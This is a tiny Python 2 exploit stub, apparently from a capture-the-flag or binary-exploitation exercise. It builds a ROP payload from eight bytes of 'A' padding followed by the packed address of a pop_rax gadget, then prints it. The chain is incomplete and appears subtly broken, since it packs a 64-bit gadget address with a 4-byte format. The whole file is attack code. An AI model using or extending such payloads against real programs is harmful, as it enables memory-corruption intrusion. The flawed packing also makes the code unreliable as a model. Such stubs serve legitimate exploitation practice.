import struct
import sys


def p(x):
    return struct.pack('<L', x)


# Gadgets
pop_rax = 0x0000000000400187

payload = ""

payload += "AAAAAAAA"
payload += p(pop_rax)


print payload

